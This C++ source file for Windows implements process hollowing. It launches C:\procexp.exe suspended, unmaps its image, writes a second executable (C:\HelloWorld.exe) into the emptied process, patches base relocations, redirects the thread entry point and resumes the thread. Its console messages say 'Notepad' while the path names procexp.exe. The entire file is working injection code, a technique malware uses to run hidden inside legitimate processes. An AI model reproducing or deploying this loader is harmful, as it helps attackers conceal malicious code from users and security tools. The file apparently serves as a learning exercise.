#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <winternl.h>
#include <ntstatus.h>

#include <cmath>

using namespace std;
#pragma comment(lib,"ntdll.lib")

typedef NTSTATUS (   * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

typedef NTSTATUS (*NtQueryInformationProcess_)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
);

typedef struct BASE_RELOCATION_BLOCK
{
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY
{
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

int main()
{
    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
    cout << "Opening Notepad process..."<< endl;
    if (CreateProcessA(NULL,"C:\\procexp.exe",NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,pStartupInfo, pProcessInfo)== 0)
        cout << "Cannot create process"<< endl;



    cout << "Unmapping destination process sections..." << endl;

    HMODULE  ntdll_Handle = GetModuleHandle("ntdll.dll");
    NtUnmapViewOfSection unmap = (NtUnmapViewOfSection) GetProcAddress(ntdll_Handle,"NtUnmapViewOfSection");




    //
    PROCESS_BASIC_INFORMATION * PBI = new PROCESS_BASIC_INFORMATION ();

    NtQueryInformationProcess_  queryInfo = (NtQueryInformationProcess_)GetProcAddress(ntdll_Handle,"NtQueryInformationProcess");

    DWORD dwReturnLength = 0;
    PVOID ImageBaseOffset =0;

    if (queryInfo(pProcessInfo->hProcess, ProcessBasicInformation,(PVOID)PBI,sizeof(PROCESS_BASIC_INFORMATION),&dwReturnLength) == 0 )

        cout << "Queried process successfully , Peb imagebase is : " << hex << PBI->PebBaseAddress <<endl;

    //  cout << hex << (PBI->PebBaseAddress->Reserved3)  << " " << hex <<  << endl;

    ReadProcessMemory(pProcessInfo->hProcess,(PBI->PebBaseAddress->Reserved3)  + 1, &ImageBaseOffset, sizeof(ImageBaseOffset), NULL );

    cout <<"Destination imagebase is : " << hex << ImageBaseOffset<<endl;

    //<< "imagebase is :" << hex << PBI->PebBaseAddress->Reserved3
    LPVOID lpBuffer  = 0 ;

    cout << "Unmapping sections..." << endl;

    if ( unmap(pProcessInfo->hProcess,ImageBaseOffset )  != 0 )
        cout << "Unmmapping sections failed!" << endl;
    // return 0;

    cout << "Openning source file..." << endl;
    HANDLE fileHANDLE =  CreateFileA
                         (
                             "C:\\HelloWorld.exe",GENERIC_READ, 0,NULL, OPEN_EXISTING,NULL, NULL);
    if(fileHANDLE == INVALID_HANDLE_VALUE )
    {
        cout << "Cannot open source file!" << endl;
        return 0;

    }

    LPVOID pSrcFileBuffer = new BYTE[GetFileSize(fileHANDLE, NULL)];

    cout << "Reading source file..."<<endl;
    if (ReadFile(fileHANDLE, pSrcFileBuffer, GetFileSize(fileHANDLE, NULL), NULL,NULL) ==0)
        cout << "Cannot read the file!" << endl;





    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pSrcFileBuffer;

    PIMAGE_NT_HEADERS32 imageNTHeaders = (PIMAGE_NT_HEADERS32) (dosHeader->e_lfanew + pSrcFileBuffer);







    LPVOID addy =   VirtualAllocEx(pProcessInfo->hProcess,ImageBaseOffset,(SIZE_T) imageNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE );
    if (addy == 0)
    {
        cout << "virtual alloc failed" << endl;
        return 0;
    }
    cout << "Memory allocated in address : " <<hex << addy << endl;
    cout << "Source file imagebase is : " <<hex << imageNTHeaders->OptionalHeader.ImageBase << endl;

    DWORD delta = reinterpret_cast <DWORD>(ImageBaseOffset )- (imageNTHeaders->OptionalHeader.ImageBase);


    cout << "Imagebase delta is : " << hex << delta << endl;

    cout << "Setting Source file imagebase to the destination one.." << endl;

    imageNTHeaders->OptionalHeader.ImageBase =    reinterpret_cast <DWORD>(ImageBaseOffset );

    cout << "New source imagebase: " << hex << imageNTHeaders->OptionalHeader.ImageBase << endl;


    cout << "Copying Headers..." << endl;

    if ( WriteProcessMemory(pProcessInfo->hProcess, ImageBaseOffset, pSrcFileBuffer,imageNTHeaders->OptionalHeader.SizeOfHeaders, NULL ) == 0)

        cout << "Cannot copy headers!" << endl;


    PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER) (pSrcFileBuffer + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));

    cout << "Copying Sections:-"<< endl;
    for (int i = 0; i<imageNTHeaders->FileHeader.NumberOfSections; i++)
    {

        if  (strcmp (reinterpret_cast <const char *> (sectionHeaders->Name), ".reloc" ) !=0 ||(strcmp(reinterpret_cast <const char *> (sectionHeaders->Name), ".reloc" )&& delta ==0 ) )
        {
            cout << "Copying " << sectionHeaders->Name  <<" " << reinterpret_cast<ULONGLONG>(ImageBaseOffset) + sectionHeaders->VirtualAddress << endl;
            // cout << reinterpret_cast<ULONGLONG>(ImageBaseOffset) + sectionHeaders->VirtualAddress << endl;
            LPVOID newSectionAddress = (LPVOID)(reinterpret_cast<ULONGLONG>(ImageBaseOffset) + sectionHeaders->VirtualAddress);
            LPCVOID pSectionRawData = (LPCVOID)(sectionHeaders->PointerToRawData + pSrcFileBuffer);
            if(WriteProcessMemory(pProcessInfo->hProcess,newSectionAddress,pSectionRawData,sectionHeaders->SizeOfRawData,NULL )==0)
                cout << "Cannot copy section: " <<sectionHeaders->Name << endl;
        }
        else
        {
            DWORD entries =0;
            cout << "Copying " << sectionHeaders->Name  <<" " << reinterpret_cast<ULONGLONG>(ImageBaseOffset) + sectionHeaders->VirtualAddress << endl;
            LPVOID newSectionAddress = (LPVOID)(reinterpret_cast<DWORD>(ImageBaseOffset) + sectionHeaders->VirtualAddress);
            LPCVOID pSectionRawData = (LPCVOID)(sectionHeaders->PointerToRawData + pSrcFileBuffer);
            if(WriteProcessMemory(pProcessInfo->hProcess,newSectionAddress,pSectionRawData,sectionHeaders->SizeOfRawData,NULL )==0)
                cout << "Cannot copy section: " <<sectionHeaders->Name << endl;

            cout << "Imagebase delta found,Rebasing..." << endl;

            DWORD currentBlockTraversed = 0;

            PIMAGE_DATA_DIRECTORY  pRelocationTable =   (PIMAGE_DATA_DIRECTORY)imageNTHeaders->OptionalHeader.DataDirectory+IMAGE_DIRECTORY_ENTRY_BASERELOC;
            PBASE_RELOCATION_BLOCK pCurrentBlock = (PBASE_RELOCATION_BLOCK) (pSrcFileBuffer + sectionHeaders->PointerToRawData);

            // cout << pRelocationTable.Size << endl;

            //loop on blocks

            while (currentBlockTraversed <pRelocationTable->Size )
            {
                //     cout << "Block size is: " << hex << pCurrentBlock->BlockSize << endl;


                //loop on entries

                DWORD entries_count = (pCurrentBlock->BlockSize - sizeof(PBASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
                //  cout << "Entries count: " << hex <<  entries_count << endl;
                PBASE_RELOCATION_ENTRY currentEntry = (PBASE_RELOCATION_ENTRY) (pCurrentBlock + 1);
                for(int i =0; i< entries_count-2; i++)
                {


                    if (currentEntry->Type == 0)
                    {
                        //cout << "zeroo" <<endl;
                        currentEntry++;
                        continue;
                    }
                    // cout <<  currentEntry->Offset << endl;
                    DWORD dwBuffer = 0;
                     entries++;
                    //  cout << (ImageBaseOffset) +pCurrentBlock->PageAddress  + currentEntry->Offset   << endl;
                    if( ReadProcessMemory(pProcessInfo->hProcess,  ( (ImageBaseOffset) +pCurrentBlock->PageAddress + currentEntry->Offset  ),&dwBuffer,sizeof(DWORD), NULL) ==0)
                        {cout << "Reading into memory error" << endl;
                            return 0;
                        }
                    //   cout << dwBuffer << endl;

                    dwBuffer = dwBuffer +delta;
                    // cout << dwBuffer << endl;
                    if( WriteProcessMemory(pProcessInfo->hProcess,  ( (ImageBaseOffset) +pCurrentBlock->PageAddress  + currentEntry->Offset  ),&dwBuffer,sizeof(DWORD), NULL)==0)
                         {cout << "writing into memory error" << endl;
                            return 0;
                        }
                    dwBuffer = 0;
                    currentEntry++;

                }
                currentBlockTraversed += pCurrentBlock->BlockSize;
                pCurrentBlock =PBASE_RELOCATION_BLOCK( reinterpret_cast<PVOID> (pCurrentBlock) +( (pCurrentBlock->BlockSize)));

            }
            cout << "Patched " << entries << " entries!" <<  endl;
            //PBASE_RELOCATION_ENTRY pCurrentEntry = (PBASE_RELOCATION_ENTRY) ()
        }
        sectionHeaders++;
    }




    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;

    printf("Getting thread context\r\n");

    if (!GetThreadContext(pProcessInfo->hThread, pContext))
    {
        printf("Error getting context\r\n");
    }

    pContext->Eax= DWORD (ImageBaseOffset)  + imageNTHeaders->OptionalHeader.AddressOfEntryPoint ;
    cout <<         pContext->Eax << endl;
    if (!SetThreadContext(pProcessInfo->hThread, pContext))
    {
        printf("Error setting context\r\n");
    }
    printf("Resuming thread\r\n");

    if (!ResumeThread(pProcessInfo->hThread))
    {
        printf("Error resuming thread\r\n");
    }

    // PBASE_RELOCATION_ENTRY x;
    //TerminateProcess(pProcessInfo->hProcess, 0);
    return 0;
}
